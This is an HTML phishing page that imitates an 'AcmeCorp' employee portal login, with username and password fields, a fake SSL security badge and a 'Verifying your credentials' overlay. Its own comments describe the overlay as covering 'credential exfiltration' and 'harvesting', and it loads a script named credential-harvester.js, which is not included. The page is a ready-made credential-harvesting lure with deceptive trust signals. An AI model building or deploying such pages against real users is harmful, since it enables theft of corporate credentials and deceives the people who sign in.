<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AcmeCorp - Secure Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1a237e 0%, #0d47a1 50%, #01579b 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .login-container {
            background: #ffffff;
            border-radius: 12px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            width: 420px;
            overflow: hidden;
        }

        .login-header {
            background: #1a237e;
            padding: 30px;
            text-align: center;
        }

        .login-header .logo {
            font-size: 28px;
            font-weight: 700;
            color: #ffffff;
            letter-spacing: 2px;
        }

        .login-header .logo span {
            color: #64b5f6;
        }

        .login-header p {
            color: #90caf9;
            margin-top: 8px;
            font-size: 14px;
        }

        .login-body {
            padding: 40px 35px;
        }

        .login-body h2 {
            color: #333;
            font-size: 20px;
            margin-bottom: 5px;
        }

        .login-body .subtitle {
            color: #777;
            font-size: 13px;
            margin-bottom: 25px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            color: #555;
            font-size: 13px;
            font-weight: 600;
            margin-bottom: 6px;
        }

        .form-group input {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 14px;
            transition: border-color 0.3s;
            outline: none;
        }

        .form-group input:focus {
            border-color: #1a237e;
        }

        .form-options {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 25px;
            font-size: 13px;
        }

        .form-options label {
            color: #666;
            display: flex;
            align-items: center;
            gap: 5px;
            cursor: pointer;
        }

        .form-options a {
            color: #1a237e;
            text-decoration: none;
        }

        .form-options a:hover {
            text-decoration: underline;
        }

        .btn-login {
            width: 100%;
            padding: 14px;
            background: #1a237e;
            color: #ffffff;
            border: none;
            border-radius: 8px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.3s;
        }

        .btn-login:hover {
            background: #0d47a1;
        }

        .login-footer {
            text-align: center;
            padding: 20px 35px 30px;
            border-top: 1px solid #f0f0f0;
        }

        .login-footer p {
            color: #999;
            font-size: 12px;
        }

        .security-badge {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            margin-top: 10px;
            color: #4caf50;
            font-size: 12px;
        }

        .security-badge .lock-icon::before {
            content: "\1F512";
        }

        /* Loading overlay (shown during credential exfiltration) */
        .loading-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.9);
            z-index: 9999;
            align-items: center;
            justify-content: center;
            flex-direction: column;
        }

        .loading-overlay.active {
            display: flex;
        }

        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #e0e0e0;
            border-top-color: #1a237e;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .loading-overlay p {
            margin-top: 15px;
            color: #555;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-header">
            <div class="logo">ACME<span>CORP</span></div>
            <p>Employee Portal</p>
        </div>

        <div class="login-body">
            <h2>Sign In</h2>
            <p class="subtitle">Enter your corporate credentials to continue</p>

            <form id="loginForm" action="#" method="POST">
                <div class="form-group">
                    <label for="username">Email or Username</label>
                    <input type="text" id="username" name="username"
                           placeholder="john.doe@acmecorp.local" required>
                </div>

                <div class="form-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password"
                           placeholder="Enter your password" required>
                </div>

                <div class="form-options">
                    <label>
                        <input type="checkbox" name="remember"> Remember me
                    </label>
                    <a href="#">Forgot password?</a>
                </div>

                <button type="submit" class="btn-login">Sign In</button>
            </form>
        </div>

        <div class="login-footer">
            <p>&copy; 2026 AcmeCorp. All rights reserved.</p>
            <div class="security-badge">
                <span class="lock-icon"></span>
                Secured with 256-bit SSL encryption
            </div>
        </div>
    </div>

    <!-- Loading overlay shown while harvesting -->
    <div class="loading-overlay" id="loadingOverlay">
        <div class="spinner"></div>
        <p>Verifying your credentials...</p>
    </div>

    <!-- Credential harvester -->
    <script src="credential-harvester.js"></script>
</body>
</html>
